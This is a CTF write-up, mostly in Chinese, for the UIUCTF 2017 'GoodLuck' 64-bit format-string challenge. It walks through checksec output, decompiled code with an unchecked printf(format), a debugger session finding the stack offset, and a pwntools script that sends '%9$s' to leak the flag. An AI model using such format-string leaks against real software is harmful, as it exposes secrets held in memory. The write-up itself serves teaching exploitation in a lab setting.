# UIUCTF 2017 GoodLuck

> challenge name: GoodLuck
>
> file: goodluck, flag.txt 原题是远程的flag.txt，这里使用一个本地的代替
>
> original writeup: https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck
>
> 

- 64bit format string
- 目的是获取远端的flag.txt的内容，由于条件限制，这里复现时使用的是本地文件



flag.txt 文件内容：

```
flag{11111111111111111}
```



# checksec

```bash
$ checksec --file=goodluck
RELRO          STACK CANARY  NX         PIE     RPATH     RUNPATH     Symbols     FORTIFY Fortified  Fortifiable FILE
Partial RELRO  Canary found  NX enabled No PIE  No RPATH  No RUNPATH  75) Symbols   No    0          1           goodluck
```

- 开启canary，NX 保护，部分 RELRO 保护

# IDA Analysis

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+3h] [rbp-3Dh]
  int i; // [rsp+4h] [rbp-3Ch]
  int j; // [rsp+4h] [rbp-3Ch]
  char *format; // [rsp+8h] [rbp-38h] BYREF
  _IO_FILE *fp; // [rsp+10h] [rbp-30h]
  char *v9; // [rsp+18h] [rbp-28h]
  char v10[24]; // [rsp+20h] [rbp-20h] BYREF
  unsigned __int64 v11; // [rsp+38h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  fp = fopen("flag.txt", "r");
  for ( i = 0; i <= 21; ++i )
    v10[i] = _IO_getc(fp);
  fclose(fp);
  v9 = v10;
  puts("what's the flag");
  fflush(_bss_start);
  format = 0LL;
  __isoc99_scanf("%ms", &format); // 用户输入点
  for ( j = 0; j <= 21; ++j )
  {
    v4 = format[j];
    if ( !v4 || v10[j] != v4 )
    {
      puts("You answered:");
      printf(format); // 漏洞利用点
      puts("\nBut that was totally wrong lol get rekt");
      fflush(_bss_start);
      return 0;
    }
  }
  printf("That's right, the flag is %s\n", v9);
  fflush(_bss_start);
  return 0;
}
```

# offset: `%9$n`

```assembly
gef➤  b printf
Breakpoint 1 at 0x400640
gef➤  r
Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck 
what's the flag
123456
You answered:
Breakpoint 1, __printf (format=0x602830 "123456") at printf.c:28
28  printf.c: 没有那个文件或目录.
─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
   0x7ffff7a627f7 <fprintf+135>    add    rsp, 0xd8
   0x7ffff7a627fe <fprintf+142>    ret    
   0x7ffff7a627ff                  nop    
 → 0x7ffff7a62800 <printf+0>       sub    rsp, 0xd8
   0x7ffff7a62807 <printf+7>       test   al, al
   0x7ffff7a62809 <printf+9>       mov    QWORD PTR [rsp+0x28], rsi
   0x7ffff7a6280e <printf+14>      mov    QWORD PTR [rsp+0x30], rdx
───────────────────────────────────────────────────────────────────────[ stack ]────
['0x7fffffffdb08', 'l8']
8
0x00007fffffffdb08│+0x00: 0x0000000000400890  →  <main+234> mov edi, 0x4009b8    ← $rsp
0x00007fffffffdb10│+0x08: 0x0000000031000001
0x00007fffffffdb18│+0x10: 0x0000000000602830  →  0x0000363534333231 ("123456"?)
0x00007fffffffdb20│+0x18: 0x0000000000602010  →  "You answered:\ng"
0x00007fffffffdb28│+0x20: 0x00007fffffffdb30  →  "flag{11111111111111111"
0x00007fffffffdb30│+0x28: "flag{11111111111111111"
0x00007fffffffdb38│+0x30: "11111111111111"
0x00007fffffffdb40│+0x38: 0x0000313131313131 ("111111"?)
──────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x7ffff7a62800 → Name: __printf(format=0x602830 "123456")
[#1] 0x400890 → Name: main()
```

- 64bit Linux前6个参数在对应寄存器中，而分析栈可知flag在栈上的偏移为5，去除RA，则flag为第4个。fmt str存储在RDI寄存器中，是第一个参数，寄存器总共传递了6个参数，故flag相对于fmt str的距离为 `4+6-1=9`。故输入 `%9$s` 即可得到 flag 的内容
- 另外可以使用pwdgdb( https://github.com/scwuaptx/Pwngdb ) 中的fmtarg判断某个参数的偏移

```
gef➤  fmtarg 0x00007fffffffdb28
The index of format argument : 10
```





# exploit

```python
from pwn import *
context.log_level = "DEBUG"
goodluck = ELF('./goodluck')
sh = process('./goodluck')
payload = b"%9$s"
print(payload)
# gdb.attach(sh)
sh.sendline(payload)
print(sh.recv())
sh.interactive()
```



